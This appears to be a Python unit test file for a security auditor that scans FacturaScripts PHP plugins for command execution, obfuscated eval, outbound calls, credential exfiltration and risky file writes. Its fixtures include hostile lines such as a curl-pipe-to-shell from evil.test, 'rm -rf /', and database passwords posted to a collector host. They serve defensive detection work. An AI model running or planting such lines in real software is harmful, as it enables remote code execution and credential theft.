"""Pruebas del auditor de seguridad de plugins de FacturaScripts."""

from __future__ import annotations

import importlib.util
import io
import json
import sys
import tempfile
import unittest
import unittest.mock
from contextlib import redirect_stdout
from pathlib import Path


SCRIPT_PATH = Path(__file__).parents[1] / 'scripts' / 'check-security.py'
SPEC = importlib.util.spec_from_file_location('check_security', SCRIPT_PATH)
assert SPEC is not None and SPEC.loader is not None
CHECKER = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = CHECKER
SPEC.loader.exec_module(CHECKER)


def build_plugin(root: Path, files: dict[str, str]) -> Path:
    """Crea un plugin de prueba con su ini y los archivos indicados."""
    plugin = root / 'MiPlugin'
    plugin.mkdir(parents=True, exist_ok=True)
    (plugin / 'facturascripts.ini').write_text("name = 'MiPlugin'\nversion = 1.0\nmin_version = 2025\n")
    for relative, content in files.items():
        path = plugin / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content)
    return plugin


def php_class(name: str, body: str, namespace: str = 'FacturaScripts\\Plugins\\MiPlugin\\Lib') -> str:
    """Envuelve el cuerpo de un método en una clase PHP mínima."""
    return (f'<?php\nnamespace {namespace};\n\nclass {name}\n{{\n'
            f'    public function run()\n    {{\n{body}\n    }}\n}}\n')


class SecurityAuditTest(unittest.TestCase):
    """Comprueba la detección, el contexto y el filtrado del auditor de seguridad."""

    def setUp(self) -> None:
        """Prepara un directorio temporal para cada prueba."""
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)

    def tearDown(self) -> None:
        """Elimina el directorio temporal."""
        self.tmp.cleanup()

    def audit(self, files: dict[str, str], **kwargs) -> dict:
        """Audita un plugin construido con los archivos indicados."""
        return CHECKER.audit(build_plugin(self.root, files), **kwargs)

    @staticmethod
    def titles(report: dict, category: str | None = None) -> list[str]:
        """Devuelve los títulos de los hallazgos, opcionalmente de una categoría."""
        return [item['titulo'] for item in report['hallazgos']
                if category is None or item['categoria'] == category]

    @staticmethod
    def find(report: dict, category: str) -> list[dict]:
        """Devuelve los hallazgos de una categoría."""
        return [item for item in report['hallazgos'] if item['categoria'] == category]

    def test_detecta_exec_en_init_update_con_su_contexto(self) -> None:
        """Un exec en Init::update() se ejecuta al instalar y así debe indicarse."""
        init = ('<?php\nnamespace FacturaScripts\\Plugins\\MiPlugin;\n\nclass Init\n{\n'
                '    public function init(): void\n    {\n    }\n\n'
                '    public function update(): void\n    {\n'
                '        exec("curl http://evil.test/x.sh | sh");\n    }\n}\n')
        report = self.audit({'Init.php': init})

        findings = self.find(report, 'ejecucion-comandos')
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]['severidad'], 'alta')
        self.assertEqual(findings[0]['linea'], 12)
        self.assertIn('al instalar o actualizar', findings[0]['contexto'])
        self.assertTrue(report['requiere_revision'])

    def test_ignora_metodos_definiciones_cadenas_y_comentarios(self) -> None:
        """Un método llamado exec, un texto o un comentario no ejecutan comandos."""
        body = ('        // exec("rm -rf /");\n'
                '        /* system("id"); */\n'
                "        $label = 'exec(algo) y system(otro)';\n"
                '        $this->exec($label);\n'
                '        Worker::exec();\n'
                '        $sql = "EXEC(procedimiento)";\n')
        code = php_class('Uno', body).replace('    }\n}\n', '    }\n\n    public function exec() {}\n}\n')
        report = self.audit({'Lib/Uno.php': code})
        self.assertEqual(self.find(report, 'ejecucion-comandos'), [])
        self.assertEqual(self.find(report, 'codigo-dinamico'), [])

    def test_comillas_invertidas_ejecutan_comandos(self) -> None:
        """En PHP las comillas invertidas lanzan un comando de shell."""
        report = self.audit({'Lib/Dos.php': php_class('Dos', '        $out = `whoami`;')})
        self.assertIn('Ejecuta un comando con comillas invertidas', self.titles(report, 'ejecucion-comandos'))

    def test_anota_comando_fijo_y_comando_sin_escapar(self) -> None:
        """Distingue un comando literal de uno construido con variables sin escapar."""
        body = ("        exec('openssl version', $out, $code);\n"
                "        $cmd = 'convert ' . $file;\n"
                '        exec($cmd, $out);\n')
        report = self.audit({'Lib/Tres.php': php_class('Tres', body)})
        notes = [note for item in self.find(report, 'ejecucion-comandos') for note in item['notas']]
        self.assertIn("comando fijo: 'openssl version'", notes)
        self.assertIn('el comando está en la variable $cmd', notes)
        self.assertTrue(any(note.startswith('no escapa los argumentos') for note in notes))

    def test_eval_de_contenido_decodificado_es_alta(self) -> None:
        """eval(base64_decode(...)) es el patrón clásico de código ofuscado."""
        report = self.audit({'Lib/Cuatro.php': php_class('Cuatro', "        eval(base64_decode('ZWNobyAxOw=='));")})
        dynamic = self.find(report, 'codigo-dinamico')
        self.assertEqual(dynamic[0]['severidad'], 'alta')
        self.assertTrue(any('decodificado' in note for note in dynamic[0]['notas']))
        decoded = self.find(report, 'ofuscacion')
        self.assertEqual(decoded[0]['severidad'], 'alta')

    def test_base64_aislado_es_baja(self) -> None:
        """Decodificar un adjunto o una firma es habitual y no debe alarmar."""
        report = self.audit({'Lib/Cinco.php': php_class('Cinco', '        $pdf = base64_decode($this->body);')})
        self.assertEqual([item['severidad'] for item in self.find(report, 'ofuscacion')], ['baja'])
        self.assertFalse(report['requiere_revision'])

    def test_correlaciona_credenciales_y_red_como_exfiltracion(self) -> None:
        """Leer la contraseña de la base de datos y abrir una conexión en el mismo archivo."""
        body = ("        $data = ['pass' => FS_DB_PASS, 'host' => FS_DB_HOST];\n"
                "        Http::post('https://recolector.test/api', $data);\n")
        report = self.audit({'Lib/Seis.php': php_class('Seis', body)})
        exfil = self.find(report, 'posible-exfiltracion')
        self.assertEqual(len(exfil), 1)
        self.assertEqual(exfil[0]['severidad'], 'alta')
        network = self.find(report, 'red-saliente')
        self.assertIn('destino: recolector.test', network[0]['notas'])
        self.assertEqual(report['dominios'][0]['dominio'], 'recolector.test')
        self.assertIn('llamada', report['dominios'][0]['usos'])

    def test_resuelve_destino_de_variables_y_constantes(self) -> None:
        """El destino se resuelve cuando la URL está en una variable o una constante."""
        code = ('<?php\nnamespace FacturaScripts\\Plugins\\MiPlugin\\Lib;\n\nclass Siete\n{\n'
                "    const API_URL = 'https://api.proveedor.test/v1';\n\n"
                '    public function run()\n    {\n'
                '        $ch = curl_init();\n'
                '        curl_setopt($ch, CURLOPT_URL, self::API_URL);\n'
                "        $url = 'https://otro.test/datos';\n"
                '        $raw = file_get_contents($url);\n'
                '    }\n}\n')
        report = self.audit({'Lib/Siete.php': code})
        notes = [note for item in self.find(report, 'red-saliente') for note in item['notas']]
        self.assertIn('destino: api.proveedor.test', notes)
        self.assertIn('destino: otro.test (asignado a $url)', notes)

    def test_lectura_de_archivo_local_no_es_red(self) -> None:
        """file_get_contents de una ruta local no es una conexión de red."""
        body = "        $json = file_get_contents(__DIR__ . '/data.json');\n        $x = file_get_contents($path);"
        report = self.audit({'Lib/Ocho.php': php_class('Ocho', body)})
        self.assertEqual(self.find(report, 'red-saliente'), [])

    def test_javascript_solo_senala_peticiones_a_dominios_externos(self) -> None:
        """Las peticiones relativas van a la propia instalación y no se señalan."""
        js = ("fetch('EditCliente?action=x');\n"
              "fetch(`${base}/api`);\n"
              "$.ajax({url: 'ListProducto'});\n"
              "// fetch('https://comentario.test');\n"
              "fetch('https://analitica.test/collect', {method: 'POST'});\n"
              "navigator.sendBeacon('/x', data);\n")
        report = self.audit({'Assets/JS/app.js': js})
        findings = self.find(report, 'red-saliente')
        self.assertEqual([item['linea'] for item in findings], [5, 6])
        self.assertEqual(findings[0]['contexto'], 'navegador del usuario')
        self.assertNotIn('comentario.test', [item['dominio'] for item in report['dominios']])

    def test_script_externo_en_twig_indica_si_tiene_sri(self) -> None:
        """Un script de un CDN se señala e indica si protege su integridad."""
        twig = ('{# <script src="https://oculto.test/x.js"></script> #}\n'
                '<script src="https://cdn.test/lib.js" integrity="sha384-abc" crossorigin="anonymous"></script>\n'
                '<script src="https://cdn.test/otra.js"></script>\n'
                '<a href="https://ayuda.test/doc">ayuda</a>\n')
        report = self.audit({'View/Mi.html.twig': twig})
        scripts = self.find(report, 'recurso-externo')
        self.assertEqual([item['linea'] for item in scripts], [2, 3])
        self.assertIn('declara integrity (SRI)', scripts[0]['notas'])
        self.assertTrue(any(note.startswith('sin integrity') for note in scripts[1]['notas']))
        domains = {item['dominio']: item['usos'] for item in report['dominios']}
        self.assertEqual(domains['cdn.test'], ['script'])
        self.assertEqual(domains['ayuda.test'], ['referencia'])
        self.assertNotIn('oculto.test', domains)

    def test_escritura_de_php_y_config_es_alta(self) -> None:
        """Escribir archivos PHP o config.php modifica la instalación."""
        body = ("        file_put_contents(FS_FOLDER . '/Core/puerta.php', $code);\n"
                "        file_put_contents(FS_FOLDER . '/MyFiles/informe.csv', $csv);\n")
        report = self.audit({'Lib/Nueve.php': php_class('Nueve', body)})
        findings = self.find(report, 'modificacion-instalacion')
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]['linea'], 8)

    def test_controlador_publico_y_privilegios(self) -> None:
        """Señala los controladores sin login y la concesión de privilegios."""
        controller = ('<?php\nnamespace FacturaScripts\\Plugins\\MiPlugin\\Controller;\n\n'
                      'class Webhook extends Controller\n{\n'
                      '    public function publicCore(&$response)\n    {\n'
                      '        $user->admin = true;\n'
                      '        $user->setPassword($this->request->get("p"));\n'
                      '    }\n}\n')
        report = self.audit({'Controller/Webhook.php': controller})
        self.assertIn('Controlador que no exige iniciar sesión', self.titles(report, 'acceso-publico'))
        privileges = self.find(report, 'privilegios')
        self.assertEqual(len(privileges), 2)
        self.assertEqual(privileges[0]['contexto'], 'controlador accesible sin autenticación')

    def test_php_en_assets_y_ejecutables(self) -> None:
        """Un PHP en Assets/ se publica en Dinamic/Assets y puede ejecutarse directamente."""
        report = self.audit({
            'Assets/shell.php': '<?php echo 1;',
            'bin/instalar.sh': '#!/bin/sh\necho hola\n',
            '.htaccess': 'Allow from all\n',
            'composer.json': json.dumps({'scripts': {'post-install-cmd': 'php x.php'}}),
        })
        structure = {item['titulo']: item['severidad'] for item in self.find(report, 'estructura')}
        self.assertEqual(structure['Archivo PHP dentro de Assets/'], 'alta')
        self.assertEqual(structure['Incluye un ejecutable o un script ajeno a PHP'], 'media')
        self.assertEqual(structure['Incluye configuración del servidor web o de PHP'], 'media')
        self.assertEqual(structure['composer.json declara scripts'], 'media')

    def test_script_cli_rebaja_severidad(self) -> None:
        """Un script que aborta fuera de php-cli no puede lanzarse desde el navegador."""
        updater = ('<?php\nif (php_sapi_name() !== "cli") {\n    die("usa la consola");\n}\n'
                   '$url = "https://facturascripts.com/EditLanguage?code=es";\n'
                   '$data = file_get_contents($url);\nunlink("es_ES.json");\n')
        suelto = '<?php\n$data = file_get_contents("https://terceros.test/x");\n'
        report = self.audit({'Translation/updater.php': updater, 'tools/suelto.php': suelto})

        network = {item['archivo']: item for item in self.find(report, 'red-saliente')}
        self.assertEqual(network['Translation/updater.php']['severidad'], 'baja')
        self.assertIn('línea de comandos', network['Translation/updater.php']['contexto'])
        self.assertEqual(network['tools/suelto.php']['severidad'], 'media')
        self.assertIn('script suelto', network['tools/suelto.php']['contexto'])

    def test_excluye_tests_y_vendor_salvo_que_se_pidan(self) -> None:
        """Test/ y vendor/ no se analizan por defecto, pero vendor/ se declara en las limitaciones."""
        files = {
            'Test/main/UnoTest.php': php_class('UnoTest', "        exec('id');"),
            'vendor/lib/Cliente.php': php_class('Cliente', "        exec('id');"),
        }
        report = self.audit(files)
        self.assertEqual(self.find(report, 'ejecucion-comandos'), [])
        self.assertTrue(any('vendor/' in item for item in report['limitaciones']))

        report = self.audit(files, include_tests=True, include_vendor=True)
        contexts = sorted(item['contexto'] for item in self.find(report, 'ejecucion-comandos'))
        self.assertEqual(len(contexts), 2)
        self.assertIn('tests (no se ejecuta en producción)', contexts)
        severities = {item['archivo']: item['severidad'] for item in self.find(report, 'ejecucion-comandos')}
        self.assertEqual(severities['Test/main/UnoTest.php'], 'media')

    def test_ignora_claves_de_array_sql_y_clases_css(self) -> None:
        """'CREATE USER' como clave de un array o una clase CSS no son sentencias SQL."""
        body = ("        $patrones = ['CREATE USER' => '/x/', 'DROP TABLE' => '/y/'];\n"
                "        $html = '<span class=\"pc-truncate\">';\n"
                "        $this->db()->exec('DROP TABLE antigua');\n")
        report = self.audit({'Lib/Diez.php': php_class('Diez', body)})
        findings = self.find(report, 'sql-destructivo')
        self.assertEqual([(item['severidad'], item['linea']) for item in findings], [('baja', 10)])

    def test_credenciales_embebidas(self) -> None:
        """Una clave real en el código se señala; una clave de traducción o una URL no."""
        body = ("        $config = ['Password' => 're_dySxAHw9_4gURo2KLWk'];\n"
                "        $label = ['password' => 'user-password-label'];\n"
                "        $token = 'https://api.test/oauth2/token';\n")
        report = self.audit({'Lib/Once.php': php_class('Once', body)})
        findings = self.find(report, 'credenciales-embebidas')
        self.assertEqual([item['linea'] for item in findings], [8])

    def test_plugin_limpio_sale_con_cero(self) -> None:
        """Un plugin sin comportamientos sensibles devuelve 0 y lo indica."""
        plugin = build_plugin(self.root, {'Lib/Limpio.php': php_class('Limpio', '        return 1;')})
        output = io.StringIO()
        with redirect_stdout(output):
            code = CHECKER.main([str(plugin)])
        self.assertEqual(code, 0)
        self.assertIn('SIN HALLAZGOS RELEVANTES', output.getvalue())

    def test_salida_json_y_codigos_de_error(self) -> None:
        """Con hallazgos devuelve 1, y 2 si la ruta no existe."""
        plugin = build_plugin(self.root, {'Lib/Doce.php': php_class('Doce', "        shell_exec('id');")})
        output = io.StringIO()
        with redirect_stdout(output):
            code = CHECKER.main([str(plugin), '--json', '--min-severity', 'alta'])
        self.assertEqual(code, 1)
        data = json.loads(output.getvalue())
        self.assertEqual(data['resumen']['alta'], 1)
        self.assertTrue(all(item['severidad'] == 'alta' for item in data['hallazgos']))

        with redirect_stdout(io.StringIO()), unittest.mock.patch('sys.stderr', io.StringIO()):
            self.assertEqual(CHECKER.main([str(self.root / 'no-existe')]), 2)

    def test_versiones_sin_comentarios_conservan_posiciones(self) -> None:
        """Las versiones depuradas deben tener la misma longitud y líneas que el original."""
        php = "<?php\n# comentario\n#[Attr]\n$a = 'x // y'; /* b\n c */ $b = <<<EOT\nhola\nEOT;\n"
        text, code = CHECKER.strip_php(php)
        self.assertEqual(len(text), len(php))
        self.assertEqual(len(code), len(php))
        self.assertEqual(text.count('\n'), php.count('\n'))
        self.assertIn('#[Attr]', code)
        self.assertNotIn('comentario', text)
        self.assertIn("'x // y'", text)
        self.assertNotIn('hola', code)

        js = "const r = /'/g; // nota\nconst s = 'a'; fetch(`x`);\n"
        text, code = CHECKER.strip_js(js)
        self.assertEqual(len(code), len(js))
        self.assertNotIn('nota', text)
        self.assertIn('fetch(', code)


if __name__ == '__main__':
    unittest.main()
